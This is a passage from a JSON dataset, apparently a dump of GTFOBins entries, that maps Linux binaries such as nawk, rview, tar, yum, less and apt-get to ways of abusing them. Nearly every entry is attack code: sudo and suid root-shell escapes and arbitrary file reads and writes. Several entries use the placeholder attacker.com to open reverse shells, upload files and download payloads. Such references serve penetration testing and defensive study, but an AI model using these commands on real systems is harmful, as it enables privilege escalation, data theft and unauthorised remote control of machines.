"data": [{"code": "./unshare -r /bin/sh"}]}, "161": {"platform": "linux", "cmd": "unshare", "function": "sudo", "data": [{"code": "sudo unshare /bin/sh"}]}, "162": {"platform": "linux", "cmd": "ksshell", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nksshell -i $LFILE\n"}]}, "163": {"platform": "linux", "cmd": "ksshell", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./ksshell -i $LFILE\n"}]}, "164": {"platform": "linux", "cmd": "ksshell", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo ksshell -i $LFILE\n"}]}, "165": {"platform": "linux", "cmd": "xmodmap", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nxmodmap -v $LFILE\n"}]}, "166": {"platform": "linux", "cmd": "xmodmap", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./xmodmap -v $LFILE\n"}]}, "167": {"platform": "linux", "cmd": "xmodmap", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo xmodmap -v $LFILE\n"}]}, "168": {"platform": "linux", "cmd": "cupsfilter", "function": "file-read", "data": [{"code": "LFILE=file_to_read\ncupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"}]}, "169": {"platform": "linux", "cmd": "cupsfilter", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"}]}, "170": {"platform": "linux", "cmd": "cupsfilter", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"}]}, "171": {"platform": "linux", "cmd": "restic", "function": "file-upload", "data": [{"code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nrestic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"}]}, "172": {"platform": "linux", "cmd": "restic", "function": "sudo", "data": [{"code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nsudo restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"}]}, "173": {"platform": "linux", "cmd": "restic", "function": "suid", "data": [{"code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"}]}, "174": {"platform": "linux", "cmd": "pico", "function": "shell", "data": [{"code": "pico\n^R^X\nreset; sh 1>&0 2>&0\n"}, {"description": "The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.", "code": "pico -s /bin/sh\n/bin/sh\n^T\n"}]}, "175": {"platform": "linux", "cmd": "pico", "function": "file-write", "data": [{"code": "pico file_to_write\nDATA\n^O\n"}]}, "176": {"platform": "linux", "cmd": "pico", "function": "file-read", "data": [{"code": "pico file_to_read"}]}, "177": {"platform": "linux", "cmd": "pico", "function": "limited-suid", "data": [{"description": "The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.", "code": "./pico -s /bin/sh\n/bin/sh\n^T\n"}]}, "178": {"platform": "linux", "cmd": "pico", "function": "sudo", "data": [{"code": "sudo pico\n^R^X\nreset; sh 1>&0 2>&0\n"}]}, "179": {"platform": "linux", "cmd": "zypper", "function": "shell", "data": [{"description": "This requires `/bin/sh` to be copied to `/usr/lib/zypper/commands/zypper-x` and this usually requires elevated privileges.", "code": "zypper x\n"}, {"code": "TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nexport PATH=$TF:$PATH\nzypper x\n"}]}, "180": {"platform": "linux", "cmd": "zypper", "function": "sudo", "data": [{"description": "This requires `/bin/sh` to be copied to `/usr/lib/zypper/commands/zypper-x` and this usually requires elevated privileges.", "code": "sudo zypper x\n"}, {"code": "TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nsudo PATH=$TF:$PATH zypper x\n"}]}, "181": {"platform": "linux", "cmd": "check_cups", "function": "file-read", "data": [{"code": "LFILE=file_to_read\ncheck_cups --extra-opts=@$LFILE\n"}]}, "182": {"platform": "linux", "cmd": "check_cups", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo check_cups --extra-opts=@$LFILE\n"}]}, "183": {"platform": "linux", "cmd": "check_statusfile", "function": "file-read", "data": [{"code": "LFILE=file_to_read\ncheck_statusfile $LFILE\n"}]}, "184": {"platform": "linux", "cmd": "check_statusfile", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo check_statusfile $LFILE\n"}]}, "185": {"platform": "linux", "cmd": "genisoimage", "function": "file-read", "data": [{"code": "LFILE=file_to_read\ngenisoimage -q -o - \"$LFILE\"\n"}]}, "186": {"platform": "linux", "cmd": "genisoimage", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo genisoimage -q -o - \"$LFILE\"\n"}]}, "187": {"platform": "linux", "cmd": "lwp-request", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nlwp-request \"file://$LFILE\"\n"}]}, "188": {"platform": "linux", "cmd": "lwp-request", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo lwp-request \"file://$LFILE\"\n"}]}, "189": {"platform": "linux", "cmd": "uudecode", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"}]}, "190": {"platform": "linux", "cmd": "uudecode", "function": "suid", "data": [{"code": "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"}]}, "191": {"platform": "linux", "cmd": "uudecode", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n"}]}, "192": {"platform": "linux", "cmd": "nawk", "function": "shell", "data": [{"code": "nawk 'BEGIN {system(\"/bin/sh\")}'"}]}, "193": {"platform": "linux", "cmd": "nawk", "function": "non-interactive-reverse-shell", "data": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "RHOST=attacker.com\nRPORT=12345\nnawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n"}]}, "194": {"platform": "linux", "cmd": "nawk", "function": "non-interactive-bind-shell", "data": [{"description": "Run `nc target.com 12345` on the attacker box to connect to the shell.", "code": "LPORT=12345\nnawk -v LPORT=$LPORT 'BEGIN {\n    s = \"/inet/tcp/\" LPORT \"/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n"}]}, "195": {"platform": "linux", "cmd": "nawk", "function": "file-write", "data": [{"code": "LFILE=file_to_write\nnawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'\n"}]}, "196": {"platform": "linux", "cmd": "nawk", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nnawk '//' \"$LFILE\"\n"}]}, "197": {"platform": "linux", "cmd": "nawk", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./nawk '//' \"$LFILE\"\n"}]}, "198": {"platform": "linux", "cmd": "nawk", "function": "sudo", "data": [{"code": "sudo nawk 'BEGIN {system(\"/bin/sh\")}'"}]}, "199": {"platform": "linux", "cmd": "nawk", "function": "limited-suid", "data": [{"code": "./nawk 'BEGIN {system(\"/bin/sh\")}'"}]}, "200": {"platform": "linux", "cmd": "snap", "function": "sudo", "data": [{"description": "It runs commands using a specially crafted Snap package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nCOMMAND=id\ncd $(mktemp -d)\nmkdir -p meta/hooks\nprintf '#!/bin/sh\\n%s; false' \"$COMMAND\" >meta/hooks/install\nchmod +x meta/hooks/install\nfpm -n xxxx -s dir -t snap -a all meta\n```\n", "code": "sudo snap install xxxx_1.0_all.snap --dangerous --devmode\n"}]}, "201": {"platform": "linux", "cmd": "bpftrace", "function": "sudo", "data": [{"code": "sudo bpftrace -e 'BEGIN {system(\"/bin/sh\");exit()}'"}, {"code": "TF=$(mktemp)\necho 'BEGIN {system(\"/bin/sh\");exit()}' >$TF\nsudo bpftrace $TF\n"}, {"code": "sudo bpftrace -c /bin/sh -e 'END {exit()}'"}]}, "202": {"platform": "linux", "cmd": "capsh", "function": "shell", "data": [{"code": "capsh --"}]}, "203": {"platform": "linux", "cmd": "capsh", "function": "suid", "data": [{"code": "./capsh --gid=0 --uid=0 --"}]}, "204": {"platform": "linux", "cmd": "capsh", "function": "sudo", "data": [{"code": "sudo capsh --"}]}, "205": {"platform": "linux", "cmd": "gtester", "function": "shell", "data": [{"code": "TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\ngtester -q $TF\n"}]}, "206": {"platform": "linux", "cmd": "gtester", "function": "sudo", "data": [{"code": "TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n"}]}, "207": {"platform": "linux", "cmd": "gtester", "function": "suid", "data": [{"code": "TF=$(mktemp)\necho '#!/bin/sh -p' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n"}]}, "208": {"platform": "linux", "cmd": "basenc", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64\n"}]}, "209": {"platform": "linux", "cmd": "basenc", "function": "suid", "data": [{"code": "LFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64\n"}]}, "210": {"platform": "linux", "cmd": "basenc", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo basenc --base64 $LFILE | basenc -d --base64\n"}]}, "211": {"platform": "linux", "cmd": "pg", "function": "shell", "data": [{"code": "pg /etc/profile\n!/bin/sh\n"}]}, "212": {"platform": "linux", "cmd": "pg", "function": "file-read", "data": [{"code": "pg file_to_read"}]}, "213": {"platform": "linux", "cmd": "pg", "function": "sudo", "data": [{"code": "sudo pg /etc/profile\n!/bin/sh\n"}]}, "214": {"platform": "linux", "cmd": "pg", "function": "suid", "data": [{"code": "./pg file_to_read"}]}, "215": {"platform": "linux", "cmd": "byebug", "function": "shell", "data": [{"code": "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nbyebug $TF\ncontinue\n"}]}, "216": {"platform": "linux", "cmd": "byebug", "function": "limited-suid", "data": [{"code": "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\n./byebug $TF\ncontinue\n"}]}, "217": {"platform": "linux", "cmd": "byebug", "function": "sudo", "data": [{"code": "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nsudo byebug $TF\ncontinue\n"}]}, "218": {"platform": "linux", "cmd": "less", "function": "shell", "data": [{"code": "less /etc/profile\n!/bin/sh\n"}, {"code": "VISUAL=\"/bin/sh -c '/bin/sh'\" less /etc/profile\nv\n"}]}, "219": {"platform": "linux", "cmd": "less", "function": "file-read", "data": [{"code": "less file_to_read"}, {"description": "This is useful when `less` is used as a pager by another binary to read a different file.", "code": "less /etc/profile\n:e file_to_read\n"}]}, "220": {"platform": "linux", "cmd": "less", "function": "file-write", "data": [{"code": "echo DATA | less\nsfile_to_write\nq\n"}, {"description": "This invokes the default editor to edit the file. The file must exist.", "code": "less file_to_write\nv\n"}]}, "221": {"platform": "linux", "cmd": "less", "function": "sudo", "data": [{"code": "sudo less /etc/profile\n!/bin/sh\n"}]}, "222": {"platform": "linux", "cmd": "less", "function": "suid", "data": [{"code": "./less file_to_read"}]}, "223": {"platform": "linux", "cmd": "virsh", "function": "sudo", "data": [{"code": "SCRIPT=script_to_run\nTF=$(mktemp)\ncat > $TF << EOF\n<domain type='kvm'>\n  <name>x</name>\n  <os>\n    <type arch='x86_64'>hvm</type>\n  </os>\n  <memory unit='KiB'>1</memory>\n  <devices>\n    <interface type='ethernet'>\n      <script path='$SCRIPT'/>\n    </interface>\n  </devices>\n</domain>\nEOF\nsudo virsh -c qemu:///system create $TF\nvirsh -c qemu:///system destroy x\n"}]}, "224": {"platform": "linux", "cmd": "virsh", "function": "file-write", "data": [{"description": "This requires the user to be in the `libvirt` group to perform privileged file write. If the target directory doesn't exist, `pool-create-as` must be run with the `--build` option. The destination file ownership and permissions can be set in the XML.", "code": "LFILE_DIR=/root\nLFILE_NAME=file_to_write\n\necho 'data' > data_to_write\n\nTF=$(mktemp)\ncat > $TF <<EOF\n<volume type='file'>\n  <name>y</name>\n  <key>$LFILE_DIR/$LFILE_NAME</key>\n  <source>\n  </source>\n  <capacity unit='bytes'>5</capacity>\n  <allocation unit='bytes'>4096</allocation>\n  <physical unit='bytes'>5</physical>\n  <target>\n    <path>$LFILE_DIR/$LFILE_NAME</path>\n    <format type='raw'/>\n    <permissions>\n      <mode>0600</mode>\n      <owner>0</owner>\n      <group>0</group>\n    </permissions>\n  </target>\n</volume>\nEOF\n\nvirsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR\nvirsh -c qemu:///system vol-create --pool x --file $TF\nvirsh -c qemu:///system vol-upload --pool x $LFILE_DIR/$LFILE_NAME data_to_write\nvirsh -c qemu:///system pool-destroy x\n"}]}, "225": {"platform": "linux", "cmd": "virsh", "function": "file-read", "data": [{"description": "This requires the user to be in the `libvirt` group to perform privileged file read.", "code": "LFILE_DIR=/root\nLFILE_NAME=file_to_read\n\nSPATH=file_to_save\n\nvirsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR\nvirsh -c qemu:///system vol-download --pool x $LFILE_NAME $SPATH\nvirsh -c qemu:///system pool-destroy x\n"}]}, "226": {"platform": "linux", "cmd": "diff", "function": "file-read", "data": [{"code": "LFILE=file_to_read\ndiff --line-format=%L /dev/null $LFILE\n"}]}, "227": {"platform": "linux", "cmd": "diff", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE\n"}]}, "228": {"platform": "linux", "cmd": "diff", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo diff --line-format=%L /dev/null $LFILE\n"}]}, "229": {"platform": "linux", "cmd": "gem", "function": "shell", "data": [{"description": "This requires the name of an installed gem to be provided (`rdoc` is usually installed).", "code": "gem open -e \"/bin/sh -c /bin/sh\" rdoc"}, {"description": "This invokes the default editor, which is likely to be [`vi`](/gtfobins/vi/), other functions may apply. This requires the name of an installed gem to be provided (`rdoc` is usually installed).", "code": "gem open rdoc\n:!/bin/sh\n"}, {"description": "This executes the specified file as [`ruby`](/gtfobins/ruby/) code.", "code": "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/x\ngem build $TF/x\n"}, {"description": "This executes the specified file as [`ruby`](/gtfobins/ruby/) code.", "code": "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/x\ngem install --file $TF/x\n"}]}, "230": {"platform": "linux", "cmd": "gem", "function": "sudo", "data": [{"description": "This requires the name of an installed gem to be provided (`rdoc` is usually installed).", "code": "sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc"}]}, "231": {"platform": "linux", "cmd": "apt-get", "function": "shell", "data": [{"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "apt-get changelog apt\n!/bin/sh\n"}]}, "232": {"platform": "linux", "cmd": "apt-get", "function": "sudo", "data": [{"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "sudo apt-get changelog apt\n!/bin/sh\n"}, {"description": "For this to work the target package (e.g., `sl`) must not be installed.", "code": "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt-get install -c $TF sl\n"}, {"description": "When the shell exits the `update` command is actually executed.", "code": "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"}]}, "233": {"platform": "linux", "cmd": "yum", "function": "file-download", "data": [{"description": "Fetch a remote file via HTTP GET request. The file on the remote host must have an extension of `.rpm`, the content does not have to be an RPM file. The file will be downloaded to a randomly created directory in `/var/tmp`, for example `/var/tmp/yum-root-cR0O4h/`.", "code": "RHOST=attacker.com\nRFILE=file_to_get.rpm\nyum install http://$RHOST/$RFILE\n"}]}, "234": {"platform": "linux", "cmd": "yum", "function": "sudo", "data": [{"description": "It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n```\n", "code": "sudo yum localinstall -y x-1.0-1.noarch.rpm\n"}, {"description": "Spawn interactive root shell by loading a custom plugin.\n", "code": "TF=$(mktemp -d)\ncat >$TF/x<<EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\ncat >$TF/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >$TF/y.py<<EOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')\nEOF\n\nsudo yum -c $TF/x --enableplugin=y\n"}]}, "235": {"platform": "linux", "cmd": "valgrind", "function": "shell", "data": [{"code": "valgrind /bin/sh"}]}, "236": {"platform": "linux", "cmd": "valgrind", "function": "sudo", "data": [{"code": "sudo valgrind /bin/sh"}]}, "237": {"platform": "linux", "cmd": "emacs", "function": "shell", "data": [{"code": "emacs -Q -nw --eval '(term \"/bin/sh\")'"}]}, "238": {"platform": "linux", "cmd": "emacs", "function": "file-write", "data": [{"code": "emacs file_to_write\nDATA\nC-x C-s\n"}]}, "239": {"platform": "linux", "cmd": "emacs", "function": "file-read", "data": [{"code": "emacs file_to_read"}]}, "240": {"platform": "linux", "cmd": "emacs", "function": "suid", "data": [{"code": "./emacs -Q -nw --eval '(term \"/bin/sh -p\")'"}]}, "241": {"platform": "linux", "cmd": "emacs", "function": "sudo", "data": [{"code": "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"}]}, "242": {"platform": "linux", "cmd": "iftop", "function": "shell", "data": [{"code": "iftop\n!/bin/sh\n"}]}, "243": {"platform": "linux", "cmd": "iftop", "function": "limited-suid", "data": [{"code": "./iftop\n!/bin/sh\n"}]}, "244": {"platform": "linux", "cmd": "iftop", "function": "sudo", "data": [{"code": "sudo iftop\n!/bin/sh\n"}]}, "245": {"platform": "linux", "cmd": "start-stop-daemon", "function": "shell", "data": [{"code": "start-stop-daemon -n $RANDOM -S -x /bin/sh"}]}, "246": {"platform": "linux", "cmd": "start-stop-daemon", "function": "suid", "data": [{"code": "./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p"}]}, "247": {"platform": "linux", "cmd": "start-stop-daemon", "function": "sudo", "data": [{"code": "sudo start-stop-daemon -n $RANDOM -S -x /bin/sh"}]}, "248": {"platform": "linux", "cmd": "rview", "function": "shell", "data": [{"description": "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"}, {"description": "This requires that `rview` is compiled with Lua support.", "code": "rview -c ':lua os.execute(\"reset; exec sh\")'"}]}, "249": {"platform": "linux", "cmd": "rview", "function": "reverse-shell", "data": [{"description": "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nrview -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'\n"}]}, "250": {"platform": "linux", "cmd": "rview", "function": "non-interactive-reverse-shell", "data": [{"description": "Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nrview -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n"}]}, "251": {"platform": "linux", "cmd": "rview", "function": "non-interactive-bind-shell", "data": [{"description": "Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.", "code": "export LPORT=12345\nrview -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n"}]}, "252": {"platform": "linux", "cmd": "rview", "function": "file-upload", "data": [{"description": "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via \"d\" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.", "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\nrview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'\n"}, {"description": "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.", "code": "export LPORT=8888\nrview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'\n"}, {"description": "Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nrview -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n"}]}, "253": {"platform": "linux", "cmd": "rview", "function": "file-download", "data": [{"description": "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nrview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'\n"}, {"description": "Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.", "code": "export LPORT=12345\nexport LFILE=file_to_save\nrview -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n"}]}, "254": {"platform": "linux", "cmd": "rview", "function": "file-write", "data": [{"code": "rview file_to_write\niDATA\n^[\nw!\n"}]}, "255": {"platform": "linux", "cmd": "rview", "function": "file-read", "data": [{"code": "rview file_to_read"}]}, "256": {"platform": "linux", "cmd": "rview", "function": "library-load", "data": [{"description": "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "rview -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"}]}, "257": {"platform": "linux", "cmd": "rview", "function": "suid", "data": [{"description": "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "./rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"}]}, "258": {"platform": "linux", "cmd": "rview", "function": "sudo", "data": [{"description": "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "sudo rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"}, {"description": "This requires that `rview` is compiled with Lua support.", "code": "sudo rview -c ':lua os.execute(\"reset; exec sh\")'"}]}, "259": {"platform": "linux", "cmd": "rview", "function": "capabilities", "data": [{"description": "This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "./rview -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"}]}, "260": {"platform": "linux", "cmd": "rview", "function": "limited-suid", "data": [{"description": "This requires that `rview` is compiled with Lua support.", "code": "./rview -c ':lua os.execute(\"reset; exec sh\")'"}]}, "261": {"platform": "linux", "cmd": "hd", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nhd \"$LFILE\"\n"}]}, "262": {"platform": "linux", "cmd": "hd", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./hd \"$LFILE\"\n"}]}, "263": {"platform": "linux", "cmd": "hd", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo hd \"$LFILE\"\n"}]}, "264": {"platform": "linux", "cmd": "bridge", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nbridge -b \"$LFILE\"\n"}]}, "265": {"platform": "linux", "cmd": "bridge", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./bridge -b \"$LFILE\"\n"}]}, "266": {"platform": "linux", "cmd": "bridge", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo bridge -b \"$LFILE\"\n"}]}, "267": {"platform": "linux", "cmd": "tar", "function": "shell", "data": [{"code": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"}, {"description": "This only works for GNU tar.", "code": "tar xf /dev/null -I '/bin/sh -c \"sh <&2 1>&2\"'"}, {"description": "This only works for GNU tar. It can be useful when only a limited command argument injection is available.", "code": "TF=$(mktemp)\necho '/bin/sh 0<&1' > \"$TF\"\ntar cf \"$TF.tar\" \"$TF\"\ntar xf \"$TF.tar\" --to-command sh\nrm \"$TF\"*\n"}]}, "268": {"platform": "linux", "cmd": "tar", "function": "file-upload", "data": [{"description": "This only works for GNU tar. Create tar archive and send it via SSH to a remote location. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).", "code": "RHOST=attacker.com\nRUSER=root\nRFILE=/tmp/file_to_send.tar\nLFILE=file_to_send\ntar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh\n"}]}, "269": {"platform": "linux", "cmd": "tar", "function": "file-download", "data": [{"description": "This only works for GNU tar. Download and extract a tar archive via SSH. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).", "code": "RHOST=attacker.com\nRUSER=root\nRFILE=/tmp/file_to_get.tar\ntar xvf $RUSER@$RHOST:$RFILE --rsh-command=/bin/ssh\n"}]}, "270": {"platform": "linux", "cmd": "tar", "function": "file-write", "data": [{"description": "This only works for GNU tar.", "code": "LFILE=file_to_write\nTF=$(mktemp)\necho DATA > \"$TF\"\ntar c --xform \"s@.*@$LFILE@\" -OP \"$TF\" | tar x -P\n"}]}, "271": {"platform": "linux", "cmd": "tar", "function": "file-read", "data": [{"description": "This only works for GNU tar.", "code": "LFILE=file_to_read\ntar xf \"$LFILE\" -I '/bin/sh -c \"cat 1>&2\"'\n"}]}, "272": {"platform": "linux", "cmd": "tar", "function": "sudo", "data": [{"code": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"}]}, "273": {"platform": "linux", "cmd": "tar", "function": "limited-suid", "data": [{"code": "./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"}]}, "274": {"platform": "linux", "cmd": "dmesg", "function": "file-read", "data": [{"description": "This is not suitable for binary files.", "code": "LFILE=file_to_read\ndmesg -rF \"$LFILE\"\n"}]}, "275": {"platform": "linux", "cmd": "dmesg", "function": "shell", "data": [{"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "dmesg -H\n!/bin/sh\n"}]}, "276": {"platform": "linux", "cmd": "dmesg", "function": "sudo", "data": [{"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "sudo dmesg -H\n!/bin/sh\n"}]}, "277": {"platform": "linux", "cmd": "split", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nTF=$(mktemp)\nsplit $LFILE $TF\ncat $TF*\n"}]}, "278": {"platform": "linux", "cmd": "split", "function": "file-write", "data": [{"description": "Data will be written in the current directory in a file named `xaa` by default. The input file will be split in multiple smaller files unless the `-b` option is used, pick a value in MB big enough.", "code": "TF=$(mktemp)\necho DATA >$TF\nsplit -b999m $TF\n"}, {"description": "GNU version only. Data will be written in the current directory in a file named `xaa.xxx` by default. The input file will be split in multiple smaller files unless the `-b` option is used, pick a value in MB big enough.", "code": "EXT=.xxx\nTF=$(mktemp)\necho DATA >$TF\nsplit -b999m --additional-suffix $EXTENSION $TF\n"}]}, "279": {"platform": "linux", "cmd": "split", "function": "command", "data": [{"description": "Command execution using an existing or newly created file.", "code": "COMMAND=id\nTF=$(mktemp)\nsplit --filter=$COMMAND $TF\n"}, {"description": "Command execution using stdin (and close it directly).", "code": "COMMAND=id\necho | split --filter=$COMMAND /dev/stdin\n"}]}, "280": {"platform": 